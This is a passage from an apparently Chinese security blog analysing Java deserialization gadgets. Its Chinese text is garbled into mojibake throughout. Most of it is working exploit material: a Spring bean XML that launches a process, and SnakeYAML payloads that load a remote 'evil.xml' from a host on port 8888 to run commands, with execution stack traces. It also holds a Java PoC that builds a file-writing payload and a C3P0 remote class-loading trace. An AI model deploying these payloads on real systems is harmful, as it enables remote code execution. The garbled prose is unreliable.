class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æŒ‰æ˜¯å¦æä¾› ClassLoader æ¥åˆ›å»ºç”¨äºå‘ç°è„šæœ¬å¼•æ“å·¥å‚çš„ ServiceLoaderï¼š</span></span><br><span class="line"><span class="comment"> * - è‹¥ä¼ å…¥äº† loaderï¼ˆä¾‹å¦‚è‡ªå®šä¹‰çš„ URLClassLoaderï¼‰ï¼Œå°±ç”¨å®ƒå»åš SPI å‘ç°ï¼›</span></span><br><span class="line"><span class="comment"> * - è‹¥æœªä¼ å…¥ï¼ˆä¸º nullï¼‰ï¼Œåˆ™å›é€€åˆ°â€œå·²å®‰è£…çš„â€æä¾›è€…é›†åˆï¼ˆç”±ç³»ç»Ÿ/å¹³å°ç±»åŠ è½½å™¨å¯è§çš„å®ç°ï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> ServiceLoader&lt;ScriptEngineFactory&gt; <span class="title function_">getServiceLoader</span><span class="params">(<span class="keyword">final</span> ClassLoader loader)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (loader != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨è°ƒç”¨æ–¹æŒ‡å®šçš„ ClassLoader åœ¨å…¶å¯è§èŒƒå›´å†…æŸ¥æ‰¾</span></span><br><span class="line">        <span class="comment">// META-INF/services/javax.script.ScriptEngineFactoryï¼Œå¹¶æŒ‰ SPI è§„åˆ™åŠ è½½å®ç°</span></span><br><span class="line">        <span class="keyword">return</span> ServiceLoader.load(ScriptEngineFactory.class, loader);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// æœªæŒ‡å®š ClassLoaderï¼šä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„â€œå·²å®‰è£…â€æä¾›è€…é›†åˆ</span></span><br><span class="line">        <span class="comment">//ï¼ˆç­‰ä»·äºç”±ç³»ç»Ÿ/å¹³å°ç±»åŠ è½½å™¨è¿›è¡Œå‘ç°ï¼ŒåŠ è½½ç±»è·¯å¾„æˆ–ç³»ç»Ÿå¯è§ä½ç½®ä¸­çš„å®ç°ï¼‰</span></span><br><span class="line">        <span class="keyword">return</span> ServiceLoader.loadInstalled(ScriptEngineFactory.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ–å¹¶æ”¶é›†æ‰€æœ‰å¯ç”¨çš„ ScriptEngineFactoryï¼ˆè„šæœ¬å¼•æ“å·¥å‚ï¼ŒSPI æä¾›è€…ï¼‰ã€‚</span></span><br><span class="line"><span class="comment">// æ­¥éª¤ï¼šåœ¨å—é™æƒé™ç¯å¢ƒä¸‹åˆ›å»º ServiceLoader â†’ è·å–è¿­ä»£å™¨ï¼ˆæƒ°æ€§è§£æï¼‰â†’ é€ä¸ªå®ä¾‹åŒ–å¹¶åŠ å…¥ engineSpisã€‚</span></span><br><span class="line"><span class="comment">// è®¾è®¡ï¼šå¼ºå®¹é”™ï¼ˆå•ä¸ª provider å‡ºé”™ä¸å½±å“å…¶ä»–ï¼‰ã€ä¸å‘å¤–æŠ›å¼‚å¸¸ï¼ˆå…è®¸åç»­æ‰‹åŠ¨ registerXXX æ³¨å†Œï¼‰ã€‚</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initEngines</span><span class="params">(<span class="keyword">final</span> ClassLoader loader)</span> &#123;</span><br><span class="line">    Iterator&lt;ScriptEngineFactory&gt; itr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ä»¥ç‰¹æƒåŠ¨ä½œåˆ›å»º ServiceLoaderï¼ˆå…¼å®¹è€çš„ SecurityManager åœºæ™¯ï¼Œè¯»å– META-INF/services/...ï¼‰</span></span><br><span class="line">        ServiceLoader&lt;ScriptEngineFactory&gt; sl = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;ServiceLoader&lt;ScriptEngineFactory&gt;&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> ServiceLoader&lt;ScriptEngineFactory&gt; <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">// æ ¹æ®ä¼ å…¥çš„ loader å†³å®šæœç´¢èŒƒå›´ï¼š</span></span><br><span class="line">                    <span class="comment">// - éç©ºï¼šServiceLoader.load(..., loader)</span></span><br><span class="line">                    <span class="comment">// - ä¸ºç©ºï¼šgetServiceLoader å†…éƒ¨èµ° loadInstalledï¼ˆåªæŸ¥â€œå·²å®‰è£…â€çš„ç±»åŠ è½½å™¨å±‚çº§ï¼Œæ›´ä¿å®ˆï¼‰</span></span><br><span class="line">                    <span class="keyword">return</span> getServiceLoader(loader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ServiceLoader æ˜¯æƒ°æ€§çš„ï¼šæ­¤å¤„ä»…æ‹¿åˆ°è¿­ä»£å™¨ï¼›çœŸæ­£çš„ç±»åè§£æ/ç±»åŠ è½½/å®ä¾‹åŒ–</span></span><br><span class="line">        <span class="comment">// å¯èƒ½åœ¨ hasNext()/next() æœŸé—´å‘ç”Ÿï¼Œå› æ­¤åé¢è¿˜è¦åˆ†åˆ«æ•è·å¼‚å¸¸ã€‚</span></span><br><span class="line">        itr = sl.iterator();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ServiceConfigurationError err) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// éå†æ‰€æœ‰å¯å‘ç°çš„ ScriptEngineFactory æä¾›è€…</span></span><br><span class="line">        <span class="keyword">while</span> (itr.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// æƒ°æ€§è§£æä¸‹ä¸€é¡¹ï¼šè¿™é‡Œå¯èƒ½è§¦å‘ç±»åŠ è½½/æ— å‚æ„é€ /é™æ€åˆå§‹åŒ–ï¼Œè‹¥å¤±è´¥ä¼šåŒ…æˆ ServiceConfigurationErrorã€‚</span></span><br><span class="line">                <span class="type">ScriptEngineFactory</span> <span class="variable">fact</span> <span class="operator">=</span> itr.next();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// æˆåŠŸæ‹¿åˆ°å®ç°ï¼ŒåŠ å…¥å†…éƒ¨åˆ—è¡¨ï¼Œåç»­æŒ‰åç§°/æ‰©å±•å/MIME åšåŒ¹é…æ—¶ä½¿ç”¨ã€‚</span></span><br><span class="line">                engineSpis.add(fact);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServiceConfigurationError err) &#123;</span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ServiceConfigurationError err) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="SpringFramework-è¿œç¨‹åŠ è½½é…ç½®"><a href="#SpringFramework-è¿œç¨‹åŠ è½½é…ç½®" class="headerlink" title="SpringFramework è¿œç¨‹åŠ è½½é…ç½®"></a>SpringFramework è¿œç¨‹åŠ è½½é…ç½®</h3><p>Spring å½“ä¸­æœ‰ä¸¤ä¸ªç±»çš„æ„é€ å‡½æ•°è¿œç¨‹åŠ è½½é…ç½®ï¼Œå¯ä»¥æ„æˆ RCEï¼š</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exec&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>org.springframework.context.support.ClassPathXmlApplicationContext</code>ï¼š</p>
<div class="code-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.springframework.context.support.ClassPathXmlApplicationContext</span> [<span class="string">&quot;http://127.0.0.1:8888/evil.xml&quot;</span>]</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">at java.lang.ProcessBuilder.start(ProcessBuilder.java:1007)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:497)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1930)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1872)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1800)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:620)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory$$Lambda$14.1325056130.getObject(Unknown Source:-1)</span><br><span class="line">at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)</span><br><span class="line">at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:955)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:929)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:591)</span><br><span class="line">at org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:144)</span><br><span class="line">at org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:85)</span><br></pre></td></tr></table></figure></div>



<p><code>org.springframework.context.support.FileSystemXmlApplicationContext</code>ï¼š</p>
<div class="code-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.springframework.context.support.FileSystemXmlApplicationContext</span> [<span class="string">&quot;http://127.0.0.1:8888/evil.xml&quot;</span>]</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">at java.lang.ProcessBuilder.start(ProcessBuilder.java:1007)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:497)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1930)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1872)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1800)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:620)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory$$Lambda$14.1325056130.getObject(Unknown Source:-1)</span><br><span class="line">at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)</span><br><span class="line">at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:955)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:929)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:591)</span><br><span class="line">at org.springframework.context.support.FileSystemXmlApplicationContext.&lt;init&gt;(FileSystemXmlApplicationContext.java:142)</span><br><span class="line">at org.springframework.context.support.FileSystemXmlApplicationContext.&lt;init&gt;(FileSystemXmlApplicationContext.java:85)</span><br></pre></td></tr></table></figure></div>

<h3 id="å†™æ–‡ä»¶åŠ è½½æœ¬åœ°-jar"><a href="#å†™æ–‡ä»¶åŠ è½½æœ¬åœ°-jar" class="headerlink" title="å†™æ–‡ä»¶åŠ è½½æœ¬åœ° jar"></a>å†™æ–‡ä»¶åŠ è½½æœ¬åœ° jar</h3><div class="code-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!sun.rmi.server.MarshalOutputStream</span> [</span><br><span class="line">  <span class="type">!!java.util.zip.InflaterOutputStream</span> [</span><br><span class="line">    <span class="type">!!java.io.FileOutputStream</span> [ <span class="type">!!java.io.File</span> [<span class="string">&quot;filePath&quot;</span>], <span class="literal">false</span> ],</span><br><span class="line">    <span class="type">!!java.util.zip.Inflater</span> &#123; <span class="attr">input:</span> <span class="type">!!binary</span> <span class="string">base64</span> &#125;,</span><br><span class="line">    <span class="string">length</span></span><br><span class="line">  ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.JavaUtils;</span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Deflater;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlFilePOC</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> createPoc(<span class="string">&quot;E:/flag.txt&quot;</span>, <span class="string">&quot;E:/a.txt&quot;</span>);</span><br><span class="line">        System.out.println(poc);</span><br><span class="line"><span class="comment">//        Yaml yaml = new Yaml();</span></span><br><span class="line"><span class="comment">//        yaml.load(poc);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createPoc</span><span class="params">(String src, String path)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] file = JavaUtils.getBytesFromFile(src);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> file.length;</span><br><span class="line">        <span class="type">byte</span>[] compressed = compress(file);</span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(compressed);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!sun.rmi.server.MarshalOutputStream &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[!!java.util.zip.InflaterOutputStream [&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;!!java.io.FileOutputStream [&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;!!java.io.File [\&quot;&quot;</span> + path + <span class="string">&quot;\&quot;],false],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span> + b64 + <span class="string">&quot; &#125;, &quot;</span> + length +</span><br><span class="line">                        <span class="string">&quot;]]&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] compress(<span class="type">byte</span>[] input) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Deflater</span> <span class="variable">deflater</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Deflater</span>();</span><br><span class="line">        deflater.setInput(input);</span><br><span class="line">        deflater.finish();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">while</span> (!deflater.finished()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">compressedSize</span> <span class="operator">=</span> deflater.deflate(buffer);</span><br><span class="line">            outputStream.write(buffer, <span class="number">0</span>, compressedSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        outputStream.close();</span><br><span class="line">        <span class="keyword">return</span> outputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h1><p><strong>C3P0</strong> æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’Œ JNDI ç»‘å®šï¼Œæ”¯æŒ JDBC3 è§„èŒƒå’Œ JDBC2 çš„æ ‡å‡†æ‰©å±•ã€‚ ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰ Hibernateã€Spring ç­‰ã€‚</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="è¿œç¨‹ç±»åŠ è½½ï¼ˆååºåˆ—åŒ–è§¦å‘ï¼‰"><a href="#è¿œç¨‹ç±»åŠ è½½ï¼ˆååºåˆ—åŒ–è§¦å‘ï¼‰" class="headerlink" title="è¿œç¨‹ç±»åŠ è½½ï¼ˆååºåˆ—åŒ–è§¦å‘ï¼‰"></a>è¿œç¨‹ç±»åŠ è½½ï¼ˆååºåˆ—åŒ–è§¦å‘ï¼‰</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">at java.lang.Runtime.exec(Runtime.java:347)</span><br><span class="line">at EvilClass.&lt;clinit&gt;(EvilClass.java:-1)</span><br><span class="line">at java.lang.Class.forName0(Class.java:-1)</span><br><span class="line">at java.lang.Class.forName(Class.java:348)</span><br><span class="line">at com.mchange.v2.naming.ReferenceableUtils.referenceToObject(ReferenceableUtils.java:91)</span><br><span class="line">at com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized.getObject(ReferenceIndirector.java:118)</span><br><span class="line">at com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase.readObject(PoolBackedDataSourceBase.java:211)</span><br></pre></td></tr></table></figure></div>

<h3 id="åŸç†åˆ†æ-1"><a href="#åŸç†åˆ†æ-1" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h3><p><code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase</code> è¿™ä¸ªç±»çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹æ²¡æœ‰åƒä¼ ç»Ÿçš„è‡ªå®šä¹‰åºåˆ—åŒ–é‚£æ ·è°ƒç”¨ <code>defaultWriteObject()</code> å’Œ <code>defaultReadObject()</code>ï¼Œè€Œæ˜¯å®Œå…¨ç”±è‡ªèº«æ§åˆ¶åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚</p>
<h4 id="åºåˆ—åŒ–è¿‡ç¨‹"><a href="#åºåˆ—åŒ–è¿‡ç¨‹" class="headerlink" title="åºåˆ—åŒ–è¿‡ç¨‹"></a>åºåˆ—åŒ–è¿‡ç¨‹</h4><p>é¦–å…ˆå…ˆè§‚å¯Ÿ <code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase</code> çš„åºåˆ—åŒ–è¿‡ç¨‹ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è‡ªå®šä¹‰çš„â€œæµæ ¼å¼ç‰ˆæœ¬å·â€ï¼ˆè‡ªå·±å†™è¿› ObjectOutputStreamï¼Œè‡ªå·±å†è¯»å‡ºæ¥åˆ¤æ–­ï¼‰</span></span><br><span class="line"><span class="comment">// ç”¨äºæ§åˆ¶ writeObject/readObject çš„å­—æ®µå¸ƒå±€æ¼”è¿›ï¼Œä¸ serialVersionUID ä¸åŒã€‚</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">short</span> <span class="variable">VERSION</span> <span class="operator">=</span> <span class="number">0x0001</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 1) å…ˆå†™å…¥è‡ªå®šä¹‰ç‰ˆæœ¬å·ï¼ŒreadObject ä¼šå…ˆè¯»å®ƒå¹¶åš switch åˆ†æ”¯</span></span><br><span class="line">    oos.writeShort(VERSION);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 2) é¢„æ¢æµ‹ï¼šå°è¯•æŠŠ connectionPoolDataSource åºåˆ—åŒ–åˆ°å­—èŠ‚æ•°ç»„</span></span><br><span class="line">        <span class="comment">//    â€”â€” è¿™é‡Œä¸æ˜¯çœŸè¦ç”¨ç»“æœï¼Œåªæ˜¯ä¸ºäº†è§¦å‘ 